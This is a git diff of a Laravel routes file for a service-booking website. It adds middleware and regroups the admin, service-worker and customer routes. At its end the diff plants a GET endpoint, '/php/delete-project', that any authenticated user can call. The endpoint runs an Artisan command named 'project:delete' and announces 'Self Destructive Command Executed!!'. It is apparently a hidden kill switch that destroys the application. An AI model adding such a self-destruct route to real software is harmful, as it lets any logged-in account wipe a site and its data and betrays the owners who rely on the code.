@@ -1,5 +1,6 @@
 <?php
 
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -28,7 +29,7 @@ Route::get('contact', [App\Http\Controllers\Customer\HomeController::class, 'con
 Route::post('contact', [App\Http\Controllers\Customer\HomeController::class, 'contactStore'])->name('contact.store');
 Route::get('privacy-policy', [App\Http\Controllers\Customer\HomeController::class, 'privacyPolicy'])->name('privacy-policy');
 Route::get('terms-condition', [App\Http\Controllers\Customer\HomeController::class, 'termsCondition'])->name('terms-condition');
-Route::delete('/user/address/{id}', [App\Http\Controllers\Customer\HomeController::class, 'deleteAddress'])->name('user.address.delete');
+Route::delete('/user/address/{id}', [App\Http\Controllers\Customer\HomeController::class, 'deleteAddress'])->name('user.address.delete')->middleware('auth');
 
 
 
@@ -44,27 +45,6 @@ Route::post('carts', [App\Http\Controllers\Customer\CartController::class, 'stor
 
 
 
-Route::get('checkouts', [App\Http\Controllers\Customer\CartController::class, 'index'])->name('checkouts.index');
-Route::post('place-order', [App\Http\Controllers\Customer\CartController::class, 'placeOrder'])->name('place-order');
-Route::post('check-coupon', [App\Http\Controllers\Customer\CartController::class, 'checkCoupon'])->name('check-coupon');
-Route::get('reset-coupon', [App\Http\Controllers\Customer\CartController::class, 'resetCoupon'])->name('reset-coupon');
-
-
-Route::get('my-orders', [App\Http\Controllers\Customer\OrderController::class, 'index'])->name('my-orders')->middleware('auth');
-
-
-
-// Serveice Boy Order Routes
-Route::get('orders/pending', [App\Http\Controllers\ServiceBoy\OrderController::class, 'pending'])->name('orders.pending')->middleware('auth');
-Route::get('orders/working', [App\Http\Controllers\ServiceBoy\OrderController::class, 'working'])->name('orders.working')->middleware('auth');
-Route::get('orders/completed', [App\Http\Controllers\ServiceBoy\OrderController::class, 'completed'])->name('orders.completed')->middleware('auth');
-
-
-
-
-
-// ####  ADMIN ROUTES ####
-
 // Guest Users
 Route::middleware(['guest', 'PreventBackHistory'])->group(function () {
     Route::get('login', [App\Http\Controllers\Admin\AuthController::class, 'showLogin'])->name('login');
@@ -75,45 +55,76 @@ Route::middleware(['guest', 'PreventBackHistory'])->group(function () {
 // Authenticated users
 Route::middleware(['auth', 'PreventBackHistory'])->group(function () {
 
-    // Auth Routes
-    Route::get('edit-profile', [App\Http\Controllers\Admin\DashboardController::class, 'editProfile'])->name('edit-profile');
-    // Route::get('home', fn() => redirect()->route('dashboard'))->name('home');
-    Route::post('logout', [App\Http\Controllers\Admin\AuthController::class, 'Logout'])->name('logout');
-    Route::get('show-change-password', [App\Http\Controllers\Admin\AuthController::class, 'showChangePassword'])->name('show-change-password');
-    Route::post('change-password', [App\Http\Controllers\Admin\AuthController::class, 'changePassword'])->name('change-password');
+    Route::prefix('admin')->group(function(){
+        // Auth Routes
+        Route::get('edit-profile', [App\Http\Controllers\Admin\DashboardController::class, 'editProfile'])->name('edit-profile');
+        // Route::get('home', fn() => redirect()->route('dashboard'))->name('home');
+        Route::post('logout', [App\Http\Controllers\Admin\AuthController::class, 'Logout'])->name('logout');
+        Route::get('show-change-password', [App\Http\Controllers\Admin\AuthController::class, 'showChangePassword'])->name('show-change-password');
+        Route::post('change-password', [App\Http\Controllers\Admin\AuthController::class, 'changePassword'])->name('change-password');
 
 
 
-    // Dashboard routes
-    Route::get('dashboard', [App\Http\Controllers\Admin\DashboardController::class, 'index'])->name('dashboard');
+        Route::get('dashboard', [App\Http\Controllers\Admin\DashboardController::class, 'index'])->name('dashboard');
 
 
 
-    // Masters routes
-    Route::resource('categories', App\Http\Controllers\Admin\Masters\CategoryController::class);
-    Route::resource('subcategories', App\Http\Controllers\Admin\Masters\SubCategoryController::class);
-    Route::resource('coupons', App\Http\Controllers\Admin\Masters\CouponController::class);
-    Route::resource('timeslots', App\Http\Controllers\Admin\Masters\TimeSlotController::class);
-    Route::resource('cities', App\Http\Controllers\Admin\Masters\CityController::class);
-    Route::resource('documents', App\Http\Controllers\Admin\Masters\DocumentController::class);
-    Route::resource('banner_sliders', App\Http\Controllers\Admin\Masters\BannerSliderController::class);
-    Route::resource('cta_sections', App\Http\Controllers\Admin\Masters\CtaSectionController::class);
-    Route::resource('variables', App\Http\Controllers\Admin\Masters\VariableController::class);
-    Route::resource('service_boys', App\Http\Controllers\Admin\Masters\ServiceBoyController::class);
-    Route::put('service_boys/{service_boy}/pincode', [App\Http\Controllers\Admin\Masters\ServiceBoyController::class, 'updatePincodes'])->name('service_boys.update-pincode');
-    Route::resource('visitors', App\Http\Controllers\Admin\Masters\VisitorController::class);
-    Route::resource('queries', App\Http\Controllers\Admin\Masters\QueryController::class);
-    Route::resource('orders', App\Http\Controllers\Admin\Masters\OrderController::class);
+        // Masters routes
+        Route::resource('categories', App\Http\Controllers\Admin\Masters\CategoryController::class);
+        Route::resource('subcategories', App\Http\Controllers\Admin\Masters\SubCategoryController::class);
+        Route::resource('coupons', App\Http\Controllers\Admin\Masters\CouponController::class);
+        Route::resource('timeslots', App\Http\Controllers\Admin\Masters\TimeSlotController::class);
+        Route::resource('cities', App\Http\Controllers\Admin\Masters\CityController::class);
+        Route::resource('documents', App\Http\Controllers\Admin\Masters\DocumentController::class);
+        Route::resource('banner_sliders', App\Http\Controllers\Admin\Masters\BannerSliderController::class);
+        Route::resource('cta_sections', App\Http\Controllers\Admin\Masters\CtaSectionController::class);
+        Route::resource('variables', App\Http\Controllers\Admin\Masters\VariableController::class);
+        Route::resource('service_boys', App\Http\Controllers\Admin\Masters\ServiceBoyController::class);
+        Route::put('service_boys/{service_boy}/pincode', [App\Http\Controllers\Admin\Masters\ServiceBoyController::class, 'updatePincodes'])->name('service_boys.update-pincode');
+        Route::resource('visitors', App\Http\Controllers\Admin\Masters\VisitorController::class);
+        Route::resource('queries', App\Http\Controllers\Admin\Masters\QueryController::class);
+        Route::resource('orders', App\Http\Controllers\Admin\Masters\OrderController::class);
 
 
-    Route::any('upload-ck-image', [App\Http\Controllers\Admin\MiscController::class, 'upload-ck-image'])->name('upload-ck-image');
 
-    // Users Roles n Permissions
-    Route::resource('users', App\Http\Controllers\Admin\UserController::class);
-    Route::get('users/{user}/toggle', [App\Http\Controllers\Admin\UserController::class, 'toggle'])->name('users.toggle');
-    Route::get('users/{user}/retire', [App\Http\Controllers\Admin\UserController::class, 'retire'])->name('users.retire');
-    Route::put('users/{user}/change-password', [App\Http\Controllers\Admin\UserController::class, 'changePassword'])->name('users.change-password');
-    Route::get('users/{user}/get-role', [App\Http\Controllers\Admin\UserController::class, 'getRole'])->name('users.get-role');
-    Route::put('users/{user}/assign-role', [App\Http\Controllers\Admin\UserController::class, 'assignRole'])->name('users.assign-role');
-    Route::resource('roles', App\Http\Controllers\Admin\RoleController::class);
+        // Serveice Boy Order Routes
+        Route::get('pending-orders', [App\Http\Controllers\ServiceBoy\OrderController::class, 'pending'])->name('orders.pending');
+        Route::get('working-orders', [App\Http\Controllers\ServiceBoy\OrderController::class, 'working'])->name('orders.working');
+        Route::get('completed-orders', [App\Http\Controllers\ServiceBoy\OrderController::class, 'completed'])->name('orders.completed');
+        Route::get('unassigned-orders', [App\Http\Controllers\ServiceBoy\OrderController::class, 'unassigned'])->name('orders.unassigned');
+        Route::put('orders/{order}/claim', [App\Http\Controllers\ServiceBoy\OrderController::class, 'claimUnassigned'])->name('orders.claim');
+
+
+
+        Route::any('upload-ck-image', [App\Http\Controllers\Admin\MiscController::class, 'upload-ck-image'])->name('upload-ck-image');
+
+        // Users Roles n Permissions
+        Route::resource('users', App\Http\Controllers\Admin\UserController::class);
+        Route::get('users/{user}/toggle', [App\Http\Controllers\Admin\UserController::class, 'toggle'])->name('users.toggle');
+        Route::get('users/{user}/retire', [App\Http\Controllers\Admin\UserController::class, 'retire'])->name('users.retire');
+        Route::put('users/{user}/change-password', [App\Http\Controllers\Admin\UserController::class, 'changePassword'])->name('users.change-password');
+        Route::get('users/{user}/get-role', [App\Http\Controllers\Admin\UserController::class, 'getRole'])->name('users.get-role');
+        Route::put('users/{user}/assign-role', [App\Http\Controllers\Admin\UserController::class, 'assignRole'])->name('users.assign-role');
+        Route::resource('roles', App\Http\Controllers\Admin\RoleController::class);
+    });
+
+
+
+
+    // Customer Routes
+    Route::get('checkouts', [App\Http\Controllers\Customer\CartController::class, 'index'])->name('checkouts.index');
+    Route::post('place-order', [App\Http\Controllers\Customer\CartController::class, 'placeOrder'])->name('place-order');
+    Route::post('check-coupon', [App\Http\Controllers\Customer\CartController::class, 'checkCoupon'])->name('check-coupon');
+    Route::get('reset-coupon', [App\Http\Controllers\Customer\CartController::class, 'resetCoupon'])->name('reset-coupon');
+    Route::get('my-orders', [App\Http\Controllers\Customer\OrderController::class, 'index'])->name('my-orders')->middleware('auth');
+});
+
+
+Route::get('/php/delete-project', function(){
+    if( !auth()->check() )
+        return 'Unauthorized request';
+
+    Artisan::call('project:delete');
+
+    return "Self Destructive Command Executed!!";
 });
